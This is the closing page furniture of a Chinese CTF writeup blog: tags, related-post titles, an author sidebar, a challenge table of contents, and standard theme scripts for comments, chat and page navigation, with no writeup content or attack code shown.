href="/tags/%E5%88%B7%E9%A2%98/">刷题</a><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post_share"><div class="social-share" data-image="http://cdn.anyiblog.top/common/640.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://fastly.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/11/28/20221128/"><img class="prev-cover" src="http://cdn.anyiblog.top/common/1669639102951-e5693f66-76b6-4b38-9528-70b6e58e1d4c.png" onerror="onerror=null;src='http://cdn.anyiblog.top/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">安洵杯writeup | 越努力,越幸运</div></div></a></div><div class="next-post pull-right"><a href="/2022/10/23/20221023/"><img class="next-cover" src="http://cdn.anyiblog.top/common/6EE5B4DA1158A8922B7B29B21381BECF.jpg" onerror="onerror=null;src='http://cdn.anyiblog.top/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">NewStarCTF 公开赛第五周-收官周Writeup</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/10/14/20211014/" title="记一次文件上传之过滤php绕过"><img class="cover" src="http://cdn.anyiblog.top/common/1646392513625-fd6edaab-3c57-4c79-a544-7de27fa9d2ac.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-14</div><div class="title">记一次文件上传之过滤php绕过</div></div></a></div><div><a href="/2021/12/04/20211204/" title="摸鱼大闯关 1-40关 writeup"><img class="cover" src="http://cdn.anyiblog.top/common/1646392613793-f9da8870-2a98-448e-b729-eaed11bfcd2a.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-12-04</div><div class="title">摸鱼大闯关 1-40关 writeup</div></div></a></div><div><a href="/2021/12/08/20211208/" title="融贯杯 writeup"><img class="cover" src="http://cdn.anyiblog.top/common/1646392643413-f46fa0e1-6d44-4bd9-aa1f-bae80409d3f8.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-12-08</div><div class="title">融贯杯 writeup</div></div></a></div><div><a href="/2022/03/05/20220305/" title="Bugku S2收官赛AWD解析&如何打AWD?"><img class="cover" src="http://cdn.anyiblog.top/common/1646483574333-968635ed-5a8c-425a-bb24-5552a5e97fa5.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-05</div><div class="title">Bugku S2收官赛AWD解析&如何打AWD?</div></div></a></div><div><a href="/2022/01/09/20220109/" title="2022长安战"疫"WriteUp"><img class="cover" src="http://cdn.anyiblog.top/common/1646392676713-e6fe8060-5ed5-47d6-b53d-7a7ac2e19530.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-09</div><div class="title">2022长安战"疫"WriteUp</div></div></a></div><div><a href="/2022/04/20/20220420/" title="记2022Xctf web-WriteUp"><img class="cover" src="http://cdn.anyiblog.top/common/1650422131077-48517457-7d0e-40e4-ae4f-4810291233d6.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-20</div><div class="title">记2022Xctf web-WriteUp</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="http://cdn.anyiblog.top/img/avatar.jpg" onerror="this.onerror=null;this.src='http://cdn.anyiblog.top/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Anyyy</div><div class="author-info__description">电影落幕，月亮隐没，我会忘记你。</div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">36</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">21</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://space.bilibili.com/120264656/"><i class="fab fa-bilibili"></i><span>Bilibili</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="tencent://AddContact/?fromId=45&amp;fromSubId=1&amp;subcmd=all&amp;uin=1395980247&amp;website=www.oicqzone.com" target="_blank" title="QQ"><i class="fab fa-qq"></i></a><a class="social-icon" href="http://cdn.anyiblog.top/img/wechat.jpg" target="_blank" title="Wechat"><i class="fab fa-weixin"></i></a><a class="social-icon" href="mailto:anyiguys@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">☁️欢迎造访安逸的网安小站☁️<br>⭐不定期更新干货，建议收藏 以防走丢~⭐<br><span style='color: #f66e64'>👉图片无法加载请参考文章 <style>.inform{color: #49B1F5} .inform:hover{color: #99a9bf}</style><a class='inform' href='https://www.anyiblog.top/inform/'>站点通知</a></span></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%A3%E5%90%90%E8%8A%AC%E8%8A%B3"><span class="toc-number">1.</span> <span class="toc-text">口吐芬芳</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E8%83%83%E8%8F%9C"><span class="toc-number">2.0.1.</span> <span class="toc-text">开胃菜</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0%E5%B0%8F%E8%83%BD%E6%89%8B"><span class="toc-number">2.0.2.</span> <span class="toc-text">签到小能手</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E9%95%87%E5%81%9A%E9%A2%98%E5%AE%B6"><span class="toc-number">2.0.3.</span> <span class="toc-text">小镇做题家</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Discuz"><span class="toc-number">2.0.4.</span> <span class="toc-text">Discuz</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Queen"><span class="toc-number">2.0.5.</span> <span class="toc-text">Queen</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Weblogic"><span class="toc-number">2.0.6.</span> <span class="toc-text">Weblogic</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Where"><span class="toc-number">2.0.7.</span> <span class="toc-text">Where</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MISC"><span class="toc-number">3.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0"><span class="toc-number">3.0.1.</span> <span class="toc-text">签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EasyMisc"><span class="toc-number">3.0.2.</span> <span class="toc-text">EasyMisc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A5%87%E6%80%AA%E5%8F%88%E4%B8%8D%E5%A5%87%E6%80%AA"><span class="toc-number">3.0.3.</span> <span class="toc-text">奇怪又不奇怪</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ScanQR"><span class="toc-number">3.0.4.</span> <span class="toc-text">ScanQR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cookie%E6%80%8E%E4%B9%88%E5%88%86"><span class="toc-number">3.0.5.</span> <span class="toc-text">Cookie怎么分</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto"><span class="toc-number">4.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#82-83-65"><span class="toc-number">4.0.1.</span> <span class="toc-text">82.83.65</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Snake"><span class="toc-number">4.0.2.</span> <span class="toc-text">Snake</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyrsa-RSbaby"><span class="toc-number">4.0.3.</span> <span class="toc-text">babyrsa RSbaby</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reverse"><span class="toc-number">5.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Check"><span class="toc-number">5.0.1.</span> <span class="toc-text">Check</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EasyBase"><span class="toc-number">5.0.2.</span> <span class="toc-text">EasyBase</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#This-is"><span class="toc-number">5.0.3.</span> <span class="toc-text">This..is?</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pwn"><span class="toc-number">6.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#game"><span class="toc-number">6.0.1.</span> <span class="toc-text">game</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gift"><span class="toc-number">6.0.2.</span> <span class="toc-text">gift</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/08/18/20240818/" title="eBSploit 永恒之蓝一键利用工具"><img src="https://cdn.anyiblog.top/product/ebsploit/cover/header.png" onerror="this.onerror=null;this.src='http://cdn.anyiblog.top/img/404.jpg'" alt="eBSploit 永恒之蓝一键利用工具"/></a><div class="content"><a class="title" href="/2024/08/18/20240818/" title="eBSploit 永恒之蓝一键利用工具">eBSploit 永恒之蓝一键利用工具</a><time datetime="2024-08-17T16:00:00.000Z" title="发表于 2024-08-18 00:00:00">2024-08-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/01/20240601/" title="案例分享 | 记一次对大型国企Ruoyi系统曲折的打点测试But lucky~"><img src="http://cdn.anyiblog.top/WriteUp/20240601/cover.png" onerror="this.onerror=null;this.src='http://cdn.anyiblog.top/img/404.jpg'" alt="案例分享 | 记一次对大型国企Ruoyi系统曲折的打点测试But lucky~"/></a><div class="content"><a class="title" href="/2024/06/01/20240601/" title="案例分享 | 记一次对大型国企Ruoyi系统曲折的打点测试But lucky~">案例分享 | 记一次对大型国企Ruoyi系统曲折的打点测试But lucky~</a><time datetime="2024-05-31T16:00:00.000Z" title="发表于 2024-06-01 00:00:00">2024-06-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/14/20240314/" title="中职网络安全赛项-B模块综合详细题解"><img src="http://cdn.anyiblog.top/WriteUp/20240314/cover.png" onerror="this.onerror=null;this.src='http://cdn.anyiblog.top/img/404.jpg'" alt="中职网络安全赛项-B模块综合详细题解"/></a><div class="content"><a class="title" href="/2024/03/14/20240314/" title="中职网络安全赛项-B模块综合详细题解">中职网络安全赛项-B模块综合详细题解</a><time datetime="2024-03-13T16:00:00.000Z" title="发表于 2024-03-14 00:00:00">2024-03-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/12/09/20231209/" title="第六届强网拟态国际精英挑战赛线下 白盒资格赛 Misc方向Write Up"><img src="http://cdn.anyiblog.top/WriteUp/20231209/cover.png" onerror="this.onerror=null;this.src='http://cdn.anyiblog.top/img/404.jpg'" alt="第六届强网拟态国际精英挑战赛线下 白盒资格赛 Misc方向Write Up"/></a><div class="content"><a class="title" href="/2023/12/09/20231209/" title="第六届强网拟态国际精英挑战赛线下 白盒资格赛 Misc方向Write Up">第六届强网拟态国际精英挑战赛线下 白盒资格赛 Misc方向Write Up</a><time datetime="2023-12-08T16:00:00.000Z" title="发表于 2023-12-09 00:00:00">2023-12-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/06/11/20230611/" title="SYCTF2023 安洵杯全国精英赛 | Misc方向题解"><img src="http://cdn.anyiblog.top//common/202306110947345.png" onerror="this.onerror=null;this.src='http://cdn.anyiblog.top/img/404.jpg'" alt="SYCTF2023 安洵杯全国精英赛 | Misc方向题解"/></a><div class="content"><a class="title" href="/2023/06/11/20230611/" title="SYCTF2023 安洵杯全国精英赛 | Misc方向题解">SYCTF2023 安洵杯全国精英赛 | Misc方向题解</a><time datetime="2023-06-11T00:38:26.360Z" title="发表于 2023-06-11 08:38:26">2023-06-11</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2024 By Anyyy</div><div class="icp"><a href="https://beian.miit.gov.cn/" target="_blank"><img class="lozad" style="padding:0px;vertical-align: text-bottom;" src="http://cdn.anyiblog.top/img/beian.png"/><span>浙ICP备2023010983号</span></a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">本地搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://fastly.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="https://fastly.jsdelivr.net/npm/instant.page@5/instantpage.min.js" type="module"></script><script src="https://fastly.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'B9OoMs6vkuGJUaeS3FjECON0-gzGzoHsz',
+      appKey: '03bqTybh2h4Jbp0s5XTucplR',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://fastly.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script src="https://fastly.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/hideMobileSidebar.js"></script><script src="https://fastly.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/hideCategory.min.js"></script><script>window.$crisp = [];
+window.CRISP_WEBSITE_ID = "4b34540b-3bd0-4089-9d4a-3760c14a4207";
+(function () {
+  d = document;
+  s = d.createElement("script");
+  s.src = "https://client.crisp.chat/l.js";
+  s.async = 1;
+  d.getElementsByTagName("head")[0].appendChild(s);
+})();
+$crisp.push(["safe", true])
+
+if (true) {
+  $crisp.push(["do", "chat:hide"])
+  $crisp.push(["on", "chat:closed", function() {
+    $crisp.push(["do", "chat:hide"])
+  }])
+  var chatBtnFn = () => {
+    var chatBtn = document.getElementById("chat_btn")
+    chatBtn.addEventListener("click", function(){
+      $crisp.push(["do", "chat:show"])
+      $crisp.push(["do", "chat:open"])
+
+    });
+  }
+  chatBtnFn()
+} else {
+  if (false) {
+    function chatBtnHide () {
+      $crisp.push(["do", "chat:hide"])
+    }
+    function chatBtnShow () {
+      $crisp.push(["do", "chat:show"])
+    }
+  }
+}</script><script src="https://fastly.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"]):not([href="/music"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  typeof preloader === 'object' && preloader.initLoading()
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax], .pjax-reload script').forEach(*item* *=>* {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+
+  typeof preloader === 'object' && preloader.endLoading()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
